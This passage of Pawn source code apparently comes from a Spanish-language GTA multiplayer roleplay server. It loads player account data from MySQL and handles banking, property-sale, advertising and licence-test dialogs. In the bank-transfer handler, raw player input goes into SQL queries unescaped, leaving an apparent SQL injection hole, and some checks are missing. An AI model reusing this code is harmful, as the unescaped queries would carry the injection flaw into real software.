					//Libreparaunanuevavar57
					cuenta[playerid][cCasa] = cache_get_row_int(0, 58, servidor[mysqlControl]);
					cuenta[playerid][cNegocio] = cache_get_row_int(0, 59, servidor[mysqlControl]);
					printf("Inicio posiciones;");
					cuenta[playerid][cPosiciones][0] = cache_get_row_float(0, 60, servidor[mysqlControl]);//Flotantes
					cuenta[playerid][cPosiciones][1] = cache_get_row_float(0, 61, servidor[mysqlControl]);//Flotantes
					cuenta[playerid][cPosiciones][2] = cache_get_row_float(0, 62, servidor[mysqlControl]);//Flotantes
					
					cuenta[playerid][cLicenciaAuto] = cache_get_row_int(0, 63, servidor[mysqlControl]);
					cuenta[playerid][cLicenciaArma] = cache_get_row_int(0, 64, servidor[mysqlControl]);
					cuenta[playerid][cGafas] = cache_get_row_int(0, 65, servidor[mysqlControl]);
					cuenta[playerid][cTutorial] = cache_get_row_int(0, 66, servidor[mysqlControl]);

					cache_get_row(0, 67, cuenta[playerid][cAntecedente1], servidor[mysqlControl], 64);
					cache_get_row(0, 68, cuenta[playerid][cAntecedente2], servidor[mysqlControl], 64);
					cache_get_row(0, 69, cuenta[playerid][cAntecedente3], servidor[mysqlControl], 64);
					cache_get_row(0, 70, cuenta[playerid][cNote1], servidor[mysqlControl], 80);
					cache_get_row(0, 71, cuenta[playerid][cNote2], servidor[mysqlControl], 80);
					cache_get_row(0, 72, cuenta[playerid][cNote3], servidor[mysqlControl], 80);
					cache_get_row(0, 73, cuenta[playerid][cNote4], servidor[mysqlControl], 80);
					cache_get_row(0, 74, cuenta[playerid][cNote5], servidor[mysqlControl], 80);
					cache_get_row(0, 75, cuenta[playerid][cSMS1], servidor[mysqlControl], 80);
					cache_get_row(0, 76, cuenta[playerid][cSMS2], servidor[mysqlControl], 80);
					cache_get_row(0, 77, cuenta[playerid][cSMS3], servidor[mysqlControl], 80);
					cache_get_row(0, 78, cuenta[playerid][cSMS4], servidor[mysqlControl], 80);
					cache_get_row(0, 79, cuenta[playerid][cSMS5], servidor[mysqlControl], 80);

					cuenta[playerid][cEncendedor] = cache_get_row_int(0, 80, servidor[mysqlControl]);
					cuenta[playerid][cCigarrillos] = cache_get_row_int(0, 81, servidor[mysqlControl]);
					cuenta[playerid][cMascara] = cache_get_row_int(0, 82, servidor[mysqlControl]);
					//Libreparaunanuevavar83
					cuenta[playerid][cAdvertencias] = cache_get_row_int(0, 84, servidor[mysqlControl]);
					cuenta[playerid][cAdminAdvertencia] = cache_get_row_int(0, 85, servidor[mysqlControl]);
					cuenta[playerid][cIdentificacion] = cache_get_row_int(0, 86, servidor[mysqlControl]);
					//Libreparaunanuevavar87
					cuenta[playerid][cArma][0] = cache_get_row_int(0, 88, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][0] = cache_get_row_int(0, 89, servidor[mysqlControl]);
					cuenta[playerid][cArma][1] = cache_get_row_int(0, 90, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][1] = cache_get_row_int(0, 91, servidor[mysqlControl]);
					cuenta[playerid][cArma][2] = cache_get_row_int(0, 92, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][2] = cache_get_row_int(0, 93, servidor[mysqlControl]);
					cuenta[playerid][cArma][3] = cache_get_row_int(0, 94, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][3] = cache_get_row_int(0, 95, servidor[mysqlControl]);
					cuenta[playerid][cArma][4] = cache_get_row_int(0, 96, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][4] = cache_get_row_int(0, 97, servidor[mysqlControl]);
					cuenta[playerid][cArma][5] = cache_get_row_int(0, 98, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][5] = cache_get_row_int(0, 99, servidor[mysqlControl]);
					cuenta[playerid][cArma][6] = cache_get_row_int(0, 100, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][6] = cache_get_row_int(0, 101, servidor[mysqlControl]);
					cuenta[playerid][cArma][7] = cache_get_row_int(0, 102, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][7] = cache_get_row_int(0, 103, servidor[mysqlControl]);
					cuenta[playerid][cArma][8] = cache_get_row_int(0, 104, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][8] = cache_get_row_int(0, 105, servidor[mysqlControl]);
					cuenta[playerid][cArma][9] = cache_get_row_int(0, 106, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][9] = cache_get_row_int(0, 107, servidor[mysqlControl]);
					cuenta[playerid][cArma][10] = cache_get_row_int(0, 108, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][10] = cache_get_row_int(0, 109, servidor[mysqlControl]);
					cuenta[playerid][cArma][11] = cache_get_row_int(0, 110, servidor[mysqlControl]);
					cuenta[playerid][cMunicion][11] = cache_get_row_int(0, 111, servidor[mysqlControl]);
					cuenta[playerid][cMaleta] = cache_get_row_int(0, 112, servidor[mysqlControl]);
					cuenta[playerid][cMochila] = cache_get_row_int(0, 113, servidor[mysqlControl]);
					cuenta[playerid][cCasco] = cache_get_row_int(0, 114, servidor[mysqlControl]);
					cuenta[playerid][cWofer] = cache_get_row_int(0, 115, servidor[mysqlControl]);
					cuenta[playerid][cFamilia] = cache_get_row_int(0, 116, servidor[mysqlControl]);
					cuenta[playerid][cFamiliaRango] = cache_get_row_int(0, 117, servidor[mysqlControl]);
					cuenta[playerid][cDesert] = cache_get_row_int(0, 118, servidor[mysqlControl]);
					cuenta[playerid][cEscopeta] = cache_get_row_int(0, 119, servidor[mysqlControl]);
					cuenta[playerid][cMP5] = cache_get_row_int(0, 120, servidor[mysqlControl]);
					cuenta[playerid][cAK47] = cache_get_row_int(0, 121, servidor[mysqlControl]);
					cuenta[playerid][cM4] = cache_get_row_int(0, 122, servidor[mysqlControl]);
					cuenta[playerid][cSniper] = cache_get_row_int(0, 123, servidor[mysqlControl]);
					cuenta[playerid][cEstiloPelea] = cache_get_row_int(0, 124, servidor[mysqlControl]);
					cuenta[playerid][cLeccion] = cache_get_row_int(0, 125, servidor[mysqlControl]);
					cuenta[playerid][cBusqueda] = cache_get_row_int(0, 126, servidor[mysqlControl]);
					cuenta[playerid][cRentado] = cache_get_row_int(0, 127, servidor[mysqlControl]);
					cuenta[playerid][cRobo] = cache_get_row_int(0, 128, servidor[mysqlControl]);
					cuenta[playerid][cDonador] = cache_get_row_int(0, 129, servidor[mysqlControl]);
					cuenta[playerid][cDonar][0] = cache_get_row_int(0, 130, servidor[mysqlControl]);
					cuenta[playerid][cDonar][1] = cache_get_row_int(0, 131, servidor[mysqlControl]);
					cuenta[playerid][cDonar][2] = cache_get_row_int(0, 132, servidor[mysqlControl]);
					cuenta[playerid][cBanDuda] = cache_get_row_int(0, 133, servidor[mysqlControl]);
					cuenta[playerid][cSeguro] = cache_get_row_int(0, 134, servidor[mysqlControl]);
					cuenta[playerid][cWalkie] = cache_get_row_int(0, 135, servidor[mysqlControl]);
					cuenta[playerid][cCabeza] = cache_get_row_int(0, 136, servidor[mysqlControl]);
					cuenta[playerid][cCasado] = cache_get_row_int(0, 137, servidor[mysqlControl]);

					cache_get_row(0, 138, cuenta[playerid][cPareja], servidor[mysqlControl], 80);

					cuenta[playerid][cEntrada] = cache_get_row_int(0, 139, servidor[mysqlControl]);
					cuenta[playerid][cPeces] = cache_get_row_int(0, 140, servidor[mysqlControl]);
					cuenta[playerid][cImplementos] = cache_get_row_int(0, 141, servidor[mysqlControl]);
					cuenta[playerid][pagas] = cache_get_row_int(0, 142, servidor[mysqlControl]);
					cuenta[playerid][cSilenciado] = cache_get_row_int(0, 143, servidor[mysqlControl]);
					cuenta[playerid][cHambre] = cache_get_row_int(0, 144, servidor[mysqlControl]);
					cuenta[playerid][cEnfermedad] = cache_get_row_int(0, 145, servidor[mysqlControl]);
					cuenta[playerid][cEnfermedad2] = cache_get_row_int(0, 146, servidor[mysqlControl]);
					cuenta[playerid][cEnfermedad3] = cache_get_row_int(0, 147, servidor[mysqlControl]);
					//Libreparaunanuevavar148
					//Libreparaunanuevavar149
					//Libreparaunanuevavar150
					cuenta[playerid][cCobrap] = cache_get_row_int(0, 151, servidor[mysqlControl]);
					cuenta[playerid][cPuntosRol] = cache_get_row_int(0, 152, servidor[mysqlControl]);
					cuenta[playerid][cTarjeta] = cache_get_row_int(0, 153, servidor[mysqlControl]);
					cuenta[playerid][cADVRol] = cache_get_row_int(0, 154, servidor[mysqlControl]);
					//Libreparaunanuevavar155
					//Libreparaunanuevavar156
					//Libreparaunanuevavar157
					cuenta[playerid][cPack] = cache_get_row_int(0, 158, servidor[mysqlControl]);
					cuenta[playerid][cPackID] = cache_get_row_int(0, 159, servidor[mysqlControl]);

					for(new i;i<MAX_SKILLS_WORK;i++)
					{
						cuenta[playerid][cSkills][i] = cache_get_row_int(0, i+160, servidor[mysqlControl]);
					}

					cuenta[playerid][cInv1][0] = cache_get_row_int(0, 173, servidor[mysqlControl]);
					cuenta[playerid][cInv1][1] = cache_get_row_int(0, 174, servidor[mysqlControl]);
					cuenta[playerid][cAHoras] = cache_get_row_int(0, 175, servidor[mysqlControl]);
					cuenta[playerid][cAMinutos] = cache_get_row_int(0, 176, servidor[mysqlControl]);
					cuenta[playerid][cMonedas] = cache_get_row_int(0, 177, servidor[mysqlControl]);
					//Libreparaunanuevavar178
					for(new i;i<5;i++)
					{
						cuenta[playerid][cSemillas][i] = cache_get_row_int(0, i+179, servidor[mysqlControl]);
					}

					cuenta[playerid][cNavidad] = cache_get_row_int(0, 184, servidor[mysqlControl]);

					cache_get_row(0, 185, cuenta[playerid][cCarcelAdmin], servidor[mysqlControl], 24);
					cache_get_row(0, 186, cuenta[playerid][cCarcelRazon], servidor[mysqlControl], 64);

					cuenta[playerid][cLicenciaVuelo] = cache_get_row_int(0, 187, servidor[mysqlControl]);
					cuenta[playerid][cLicenciaBote] = cache_get_row_int(0, 188, servidor[mysqlControl]);
					cuenta[playerid][cLicenciaMoto] = cache_get_row_int(0, 189, servidor[mysqlControl]);
					cuenta[playerid][cNegocio2] = cache_get_row_int(0, 190, servidor[mysqlControl]);
					cuenta[playerid][cCasa2] = cache_get_row_int(0, 191, servidor[mysqlControl]);
					cache_delete(R);
					
					/*new Consulta[126], Cache:R;
					mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "SELECT * FROM zz_bolsa WHERE unico=%d", cuenta[playerid][cUnico]);
					R = mysql_query(servidor[mysqlControl], Consulta, true);
					if(cache_get_row_count(servidor[mysqlControl]))
					{
						for(new v=0; v<8;v++)
						{
							acciones[playerid][aAccTipo][v] = cache_get_row_int(0, v + 1, servidor[mysqlControl]);
							acciones[playerid][aAccCantidad][v] = cache_get_row_int(0, v + 9, servidor[mysqlControl]);
						}
					}
					else
					{
						mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "INSERT INTO zz_bolsa(unico) VALUES ('%d')", cuenta[playerid][cUnico]);
						mysql_query(servidor[mysqlControl], Consulta);
					}
					cache_delete(R);
					*/
					tmp[0] = '\0';
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_juguetes WHERE nombre='%s'", Nombre(playerid));
					R = mysql_query(servidor[mysqlControl], tmp, true);
					if(cache_get_row_count(servidor[mysqlControl]))
					{
						for(new v=0; v < MAX_PLAYERTOYS; v++)
						{
							juguetes[playerid][v][ptModelID] = cache_get_row_int(0, v + 1, servidor[mysqlControl]);
							juguetes[playerid][v][ptBone] = cache_get_row_int(0, v + 6, servidor[mysqlControl]);
							juguetes[playerid][v][ptPosX] = cache_get_row_float(0, v + 11, servidor[mysqlControl]);
							juguetes[playerid][v][ptPosY] = cache_get_row_float(0, v + 16, servidor[mysqlControl]);
							juguetes[playerid][v][ptPosZ] = cache_get_row_float(0, v + 21, servidor[mysqlControl]);
							juguetes[playerid][v][ptRotX] = cache_get_row_float(0, v + 26, servidor[mysqlControl]);
							juguetes[playerid][v][ptRotY] = cache_get_row_float(0, v + 31, servidor[mysqlControl]);
							juguetes[playerid][v][ptRotZ] = cache_get_row_float(0, v + 36, servidor[mysqlControl]);
							juguetes[playerid][v][ptScaleX] = cache_get_row_float(0, v + 41, servidor[mysqlControl]);
							juguetes[playerid][v][ptScaleY] = cache_get_row_float(0, v + 46, servidor[mysqlControl]);
							juguetes[playerid][v][ptScaleZ] = cache_get_row_float(0, v + 51, servidor[mysqlControl]);
						}
					}
					else
					{
						mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_juguetes(nombre) VALUES ('%s')", Nombre(playerid));
						mysql_query(servidor[mysqlControl], tmp, false);
					}
					cache_delete(R);
					//
					tmp[0] = '\0';
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_inventario WHERE unico=%d", cuenta[playerid][cUnico]);
					R = mysql_query(servidor[mysqlControl], tmp, true);
					if(cache_get_row_count(servidor[mysqlControl]))
					{
						for(new x=0;x<6;x++)
						{
							inventario[playerid][invArmas][x] = cache_get_row_int(0, x + 1, servidor[mysqlControl]);
							inventario[playerid][invBalas][x] = cache_get_row_int(0, x + 7, servidor[mysqlControl]);
						}
						inventario[playerid][invBebida][0] = cache_get_row_int(0, 13, servidor[mysqlControl]);
						inventario[playerid][invBebida][1] = cache_get_row_int(0, 14, servidor[mysqlControl]);
					}
					else
					{
						for(new x=0;x<6;x++)
						{
							inventario[playerid][invArmas][x] = 0;
							inventario[playerid][invBalas][x] = 0;
						}
						inventario[playerid][invBebida][0] = 0;
						inventario[playerid][invBebida][1] = 0;
						
						mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_inventario(unico) VALUES ('%d')", cuenta[playerid][cUnico]);
						mysql_query(servidor[mysqlControl], tmp);
					}
					cache_delete(R);
					//
					if(cuenta[playerid][cTutorial])
					{
						for(new p=0;p<5;p++) TextDrawHideForPlayer(playerid, Presentacion[p]);
					}
					ClearChatbox(playerid, 51);
					
					format(string, sizeof(string), "Bienvenido a {EE6C68}Center Island {FFFFFF}%s!", PlayerName(playerid));
					Mensaje(playerid, COLOR_BLANCO, string);
					Mensaje(playerid, COLOR_BLANCO, "Recuerda seguir los términos y condiciones que mantiene nuestro servidor para la buena estabilidad.");
                    
					if(DobleOn)
					{
						Mensaje(playerid, COLOR_AZUL_CLARO, "Atención!:{FFFFFF} El sistema de doble experiencia esta activo, recuerda jugar para subir mas rapido de nivel.");
					}
					if(TripleOn)
					{
						Mensaje(playerid, COLOR_ROJO, "Atención!:{FFFFFF} Se ha activado el sistema de TRIPLE experiencia. Ahora subiras 3 veces mas rápido tus puntos de respeto.");
					}
					if(cuenta[playerid][cAdministrador])
					{
						format(string, sizeof(string), "{77B5D9}Atención!:{FFFFFF} Usted ingresó sesión con nivel administrativo %d.", cuenta[playerid][cAdministrador]);
						Mensaje(playerid, -1, string);
					}
					for(new i=0, t=GetMaxPlayers();i<t;i++)
					{
						if(IsPlayerConnected(i) && cuenta[i][cAdministrador]) continue;
						ShowPlayerNameTagForPlayer(playerid, (Maskuse[i]) ? (i):(-1), 0);
					}
					
					//Importante
					booleano[gIngreso]{playerid} = true;
					SpawnPlayer(playerid);
					
					tmp[0] = '\0';
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE `zz_usuarios` SET `online`=1 WHERE `id` = '%d'", cuenta[playerid][cUnico]);
					mysql_query(servidor[mysqlControl], tmp, false);
				}
				else
				{
					ShowLoginDialog(playerid, DIALOGO_INGRESO);
					Mensaje(playerid, COLOR_ROJO, "Contraseña Incorrecta!");
					FailPass++;
					if(FailPass >= 3)return Kick(playerid);
					return 1;
				}
			}
		}
		case DIALOGO_DEPOSITO:
		{
			if(!response)return 1;
			if(strval(inputtext) > obtenerDinero(playerid) || strval(inputtext) < 1)
			{
				ShowPlayerDialog(playerid, DIALOGO_DEPOSITO, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Depositar", "{FFFFFF}Escriba la cantidad exacta del dinero que quiere depositar ", "Aceptar", "Cancelar");
				Mensaje(playerid, COLOR_AMARILLO, "* Usted colocó una cantidad errónea.");
				return 1;
			}
			new dinero = strval(inputtext);
			pierdeDinero(playerid, dinero);
			cuenta[playerid][cDineroBanco] += dinero;
			actualizarCajero(playerid);
			return 1;
		}
		case DIALOGO_TRANSFERENCIA:
		{
			if(IsPlayerConnected(ObtenerIdDelNombre(inputtext)))return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta conectado.");
			
			new Cache:resultado, consulta[126];
			mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "SELECT * FROM zz_usuarios WHERE nombre = '%s';", inputtext);
			resultado = mysql_query(servidor[mysqlControl], consulta, true);
			if(!cache_get_row_count())
			{
				cache_delete(resultado);
				return Mensaje(playerid, COLOR_GRIS2, "Este jugador no tiene cuenta bancaria.");
			}
			cache_delete(resultado);
			format(cajeros[enteroChar[cajeroslot]{playerid}][tranferenciaNombre], MAX_PLAYER_NAME, "%s", inputtext);
			ShowPlayerDialog(playerid, DIALOGO_TRANSFERENCIA2, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Tansferir", "{FFFFFF}Escriba la cantidad exacta del dinero que quiere transferir.", "Aceptar", "Cancelar");
		}
		case DIALOGO_SACAR:
		{
			if(!response)return 1;
			if(strval(inputtext) > cuenta[playerid][cDineroBanco] || strval(inputtext) < 1)
			{
				Mensaje(playerid, COLOR_AMARILLO, "* Usted colocó una cantidad errónea.");
				ShowPlayerDialog(playerid, DIALOGO_SACAR, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Sacar", "{FFFFFF}Escriba la cantidad exacta del dinero que quiere sacar", "Aceptar", "Cancelar");
				return 1;
			}
			new dinero;
			dinero = strval(inputtext);
			ganaDinero(playerid, dinero);
			cuenta[playerid][cDineroBanco] -= dinero;
			return 1;
		}
		case DIALOGO_TRANSFERENCIA2:
		{
			if(!response)return 1;
			new dinerobanco, dinero = strval(inputtext);
			if(dinero > cuenta[playerid][cDineroBanco] || dinero < 1)return Mensaje(playerid, COLOR_GRIS2, "Usted no posee esa cantidad de dinero!");

			new Cache:resultado, consulta[126];
			mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "SELECT dinerobanco FROM zz_usuarios WHERE nombre = '%s';", cajeros[enteroChar[cajeroslot]{playerid}][tranferenciaNombre]);
			resultado = mysql_query(servidor[mysqlControl], consulta, true);
			
			dinerobanco = cache_get_row_int(0, 0, servidor[mysqlControl]);
			cache_delete(resultado);
			
			cuenta[playerid][cDineroBanco] -= dinero;
			mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET dinerobanco = %d WHERE nombre = '%s';", dinero + dinerobanco, cajeros[enteroChar[cajeroslot]{playerid}][tranferenciaNombre]);
			mysql_query(servidor[mysqlControl], consulta, false);
			
			format(string, sizeof(string), "\n{00ff00}Transferencia Satisfactoria\n\n{ffffff}Deudor: %s\nDestinario: %s\nMonto: %d\n", PlayerName(playerid), cajeros[enteroChar[cajeroslot]{playerid}][tranferenciaNombre], dinero);
			ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Transferencia Bancaria", string, "Aceptar", "");
			return 1;
		}
		case Dialogo_LocalizarCoche:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						if(cuenta[playerid][cCoche])
						{
							PosicionVehicular(playerid, cuenta[playerid][cCoche]);
						}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
					}
					case 1:
					{
						if(cuenta[playerid][cCoche2])
						{
							PosicionVehicular(playerid, cuenta[playerid][cCoche2]);
						}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
					}
					case 2:
					{
						if(cuenta[playerid][cCoche3])
						{
							PosicionVehicular(playerid, cuenta[playerid][cCoche3]);
						}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
					}
					case 3:
					{
						if(cuenta[playerid][cCoche4])
						{
							PosicionVehicular(playerid, cuenta[playerid][cCoche4]);
						}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
					}				
				}
			}
		}
		case Dialog_CasaSell:
		{
			if(response)
			{				
				switch(entero[playerid][sNegocio])
				{
					case 1:
					{
						new casaid = cuenta[playerid][cCasa];
						new sumaCasa = casa[casaid][hValue] + casa[casaid][hRentabil];
						new money = sumaCasa * 40 / 100;
						
						ganaDinero(playerid, money);
						format(string, sizeof(string), "Has vendido tu propiedad. Has recuperado %d$", money);
						Mensaje(playerid, COLOR_BLANCO, string);
						
						VenderPropiedad(playerid, cuenta[playerid][cCasa]);
						ActualizaCasa(cuenta[playerid][cCasa]);
						cuenta[playerid][cCasa] = 9999;
					}
					case 2:
					{
						new casaid = cuenta[playerid][cCasa2];
						new sumaCasa = casa[casaid][hValue] + casa[casaid][hRentabil];
						new money = sumaCasa * 40 / 100;
						
						ganaDinero(playerid, money);
						format(string, sizeof(string), "Has vendido tu propiedad. Has recuperado %d$", money);
						Mensaje(playerid, COLOR_BLANCO, string);
						
						VenderPropiedad(playerid, cuenta[playerid][cCasa2]);
						ActualizaCasa(cuenta[playerid][cCasa2]);
						cuenta[playerid][cCasa2] = 9999;
					}
				}
			}
			return 1;
		}
		case Dialog_NegocioSell:
		{
			if(response)
			{
				switch(entero[playerid][sNegocio])
				{
					case 1:
					{
						new bid = cuenta[playerid][cNegocio];
						new sumaNegocio = negocio[bid][bBuyPrice] + negocio[bid][bTill];
						new money = sumaNegocio * 40 / 100;

						ganaDinero(playerid, money);
						format(string, sizeof(string), "Has vendido tu negocio. Has recuperado %d$", money);
						Mensaje(playerid, COLOR_BLANCO, string);
						VenderLocal(bid);
						cuenta[playerid][cNegocio] = 9999;
						ActualizaNegocio(bid);
					}
					case 2:
					{
						new bid = cuenta[playerid][cNegocio2];
						new sumaNegocio = negocio[bid][bBuyPrice] + negocio[bid][bTill];
						new money = sumaNegocio * 40 / 100;

						ganaDinero(playerid, money);
						format(string, sizeof(string), "Has vendido tu negocio. Has recuperado %d$", money);
						Mensaje(playerid, COLOR_BLANCO, string);
						VenderLocal(bid);
						cuenta[playerid][cNegocio2] = 9999;
						ActualizaNegocio(bid);
					}
				}
			}
			return 1;
		}
		case DIALOGO_ANUNCIO_INTERNET:
		{
			if(!response) return 1;
			
			if(palabrasProhibidas(inputtext))return AccionSPAM(playerid, inputtext);
			if(adds > gettime()){
				format(string, sizeof(string), "* Tienes que esperar un minuto entre anuncio y anuncio. Prueba de aquí %d segundos.", adds - gettime());
				Mensaje(playerid, COLOR_GRIS2, string);
				return 1;
			}
			new Precio = 6 * strlen(inputtext);
			if(verificarDinero(playerid, Precio))
			{
				format(string, sizeof(string), "{13FF00}[Anuncio][INTERNET] {B1FF8C}%s (Contacto: {FFFFFF}%d{B1FF8C})", inputtext, cuenta[playerid][cTelefono]);
				OOCNews(-1, string);

				for(new i = 1; i < MAX_LINEAS-1; i++) Periodico[i] = Periodico[i+1];
				Periodico[MAX_LINEAS-1] = string;

				pierdeDinero(playerid, Precio);

				format(string, sizeof(string), "Anunciante: %s (%d)", PlayerName(playerid), playerid);
				MensajeAdmin(COLOR_BLANCO, string, 1);
				adds = gettime() + 60;
			}
		}
		case DIALOGO_CONDUCTOR_BUS:
		{
			if(!response)return 1;
			new listed = listitem + 1;
			cuenta[playerid][selecciono] = listed;
			SetPlayerCheckpoint(playerid, trabBuses[listed][busPos][0], trabBuses[listed][busPos][1], trabBuses[listed][busPos][2], 4.0);
			format(string, sizeof(string), "~g~%s ~w~fue marcada en su GPS.", trabBuses[listed][busLugar]);
			TextoInformatico(10, playerid, string);
			format(string, sizeof(string), "** El chofer %s a comenzado el recorrido por la %s.", PlayerName(playerid), trabBuses[listed][busLugar]);
			OOCNews(COLOR_LIMA, string);
			return 1;
		}
		case DIALOGO_PUBLICIDAD:
		{
			if(response)
			{
				ShowPlayerDialog(playerid, DIALOGO_PUBLICIDAD_A, DIALOG_STYLE_INPUT, "[!]Publica tu anuncio", "{ffffff}Escriba el anuncio que desea mostrar\n{ff0000}Nota: Maximo de caracteres 44.", "Aceptar", "Volver");
				enteroChar[nPublicidad]{playerid} = listitem;
			}
			return 1;
		}
		case DIALOGO_PUBLICIDAD_A:
		{
			if(response)
			{
				new Precio = 100 * strlen(inputtext), aid = enteroChar[nPublicidad]{playerid}, strons[324];
				if(Publicidad[aid][_pTime] != 0)return Mensaje(playerid, COLOR_ROJO, "Este cartel ya esta en uso.");
				if(strlen(inputtext) < 10 || strlen(inputtext) > 44)return Mensaje(playerid, COLOR_ROJO, "El maximo de caracteres es de 44, minimo 10.");
				if(verificarDinero(playerid, Precio)){
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1: 	Publicidad[aid][_pTime] = gettime() + 9000;
						case 2: 	Publicidad[aid][_pTime] = gettime() + 9600;
						case 3:		Publicidad[aid][_pTime] = gettime() + 10200;
						case 4:		Publicidad[aid][_pTime] = gettime() + 10800;
						default:	Publicidad[aid][_pTime] = gettime() + 7200;
					}
					
					DestroyObject(Publicidad[aid][_pObjecto]);
					Publicidad[aid][_pObjecto] = CreateObject(4729, Publicidad[aid][_pPosx], Publicidad[aid][_pPosy], Publicidad[aid][_pPosz], 0.0000, 0.0000, Publicidad[aid][_pPosrz], 1000.0);
					
					format(strons, sizeof(strons), "{FFA500}Center Island RolePlay\n {FFFFFF}%s \n{FFA500}Anunciante:{FFFFFF} %s - {00FF00}Contacto:{FFFFFF} %d", inputtext, PlayerName(playerid), cuenta[playerid][cTelefono]);
					SetObjectMaterialText(Publicidad[aid][_pObjecto], strons, 0, 120, "impact", 32, 0, -32256, -16777216, 1);

					format(strons, sizeof(strons), "Usted ha publicado su anuncio por {FFA500}%s{FFFFFF}, valor {00FF00}%d$", ObtenerTiempoRestante(Publicidad[aid][_pTime]), Precio);
					
					pierdeDinero(playerid, Precio);
					Mensaje(playerid, COLOR_BLANCO, strons);
					Mensaje(playerid, COLOR_ROJO, "IMPORTANTE: Si usted publico un anuncio PG o Antirol, el mismo sera borrado y usted sancionado.");
				}
				else
				{
					format(string, sizeof(string), "Usted no tiene dinero, requiere $%d", Precio);
					Mensaje(playerid, COLOR_ROJO, string);
				}
			}
			else
			{
				ShowPlayerDialog(playerid, DIALOGO_PUBLICIDAD, DIALOG_STYLE_LIST, "[!]Publica tu anuncio", "Commerce - Comiseria\nIdlewood - 24/7/nCommerce - 24/7/nDowntown - Ammunation/nSanta Maria Beach - Autopista 1/nSanta Maria Beach - Autopista 2/nSanta Maria Beach - Autopista 3/nWillowfield - Basureros/nEast Los Santos - Puente Ganton/nGlenn Park - Estacionamiento", "Aceptar", "Cancelar");
			}
			return 1;
		}
		case DIALOG_EDITAR_PUBLICIDAD:
		{
			if(response)
			{
				new aid = listitem;
				Publicidad[aid][_pTime] = 0;
				DestroyObject(Publicidad[aid][_pObjecto]);
				Publicidad[aid][_pObjecto] = CreateObject(4729, Publicidad[aid][_pPosx], Publicidad[aid][_pPosy], Publicidad[aid][_pPosz], 0.0000, 0.0000, Publicidad[aid][_pPosrz], 1000.0);
				SetObjectMaterialText(Publicidad[aid][_pObjecto], "Center Island RolePlay\n\n {FFFFFF}Publicidad Disponible", 0, 120, "impact", 32, 0, -32256, -16777216, 1);
				return 1;
			}
			return 1;
		}
		case DIALOGO_OBTENER_LICENCIA:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						if(cuenta[playerid][cLicenciaMoto])return Mensaje(playerid, COLOR_ROJO, "Usted ya posee licencia de conducir moto.");
						if(obtenerDinero(playerid) < 250)return Mensaje(playerid, COLOR_ROJO, "No tienes para pagar el examen.");
						for(new i=0; i<sizeof(obtenerLicencia); i++)
						{
							if(obtenerLicencia[i][cocheModelo] == 586 && obtenerLicencia[i][cocheUse] == false)
							{
								obtenerLicencia[i][cocheUse] = true;
								enteroChar[lictipo]{playerid} = 0;
								enteroChar[licslot]{playerid} = i;
								SetPosEx(playerid, obtenerLicencia[i][cochePos][0], obtenerLicencia[i][cochePos][1], obtenerLicencia[i][cochePos][2], obtenerLicencia[i][cochePos][3], obtenerLicencia[i][cocheInterior], obtenerLicencia[i][cocheWorld]);
								PutPlayerInVehicleEx(playerid, obtenerLicencia[i][cocheExamen], 0);
								comenzarPrueba(playerid);
								pierdeDinero(playerid, 250);
								break;
							}
						}
					}
					case 1:
					{
						if(cuenta[playerid][cLicenciaAuto])return Mensaje(playerid, COLOR_ROJO, "Usted ya posee licencia de conducir auto.");
						if(obtenerDinero(playerid) < 450)return Mensaje(playerid, COLOR_ROJO, "No tienes para pagar el examen.");
						for(new i=0; i<sizeof(obtenerLicencia); i++)
						{
							if(obtenerLicencia[i][cocheModelo] == 410 && obtenerLicencia[i][cocheUse] == false)
							{
								obtenerLicencia[i][cocheUse] = true;
								enteroChar[lictipo]{playerid} = 1;
								enteroChar[licslot]{playerid} = i;
								SetPosEx(playerid, obtenerLicencia[i][cochePos][0], obtenerLicencia[i][cochePos][1], obtenerLicencia[i][cochePos][2], obtenerLicencia[i][cochePos][3], obtenerLicencia[i][cocheInterior], obtenerLicencia[i][cocheWorld]);
								PutPlayerInVehicleEx(playerid, obtenerLicencia[i][cocheExamen], 0);
								comenzarPrueba(playerid);
								pierdeDinero(playerid, 450);
								break;
							}
						}
					}
					case 2:
					{
						if(cuenta[playerid][cLicenciaVuelo])return Mensaje(playerid, COLOR_ROJO, "Usted ya posee licencia de vuelo.");
						if(obtenerDinero(playerid) < 7000)return Mensaje(playerid, COLOR_ROJO, "No tienes para pagar el examen.");
						for(new i=0; i<sizeof(obtenerLicencia); i++)
						{
							if(obtenerLicencia[i][cocheModelo] == 593 && obtenerLicencia[i][cocheUse] == false)
							{
								obtenerLicencia[i][cocheUse] = true;
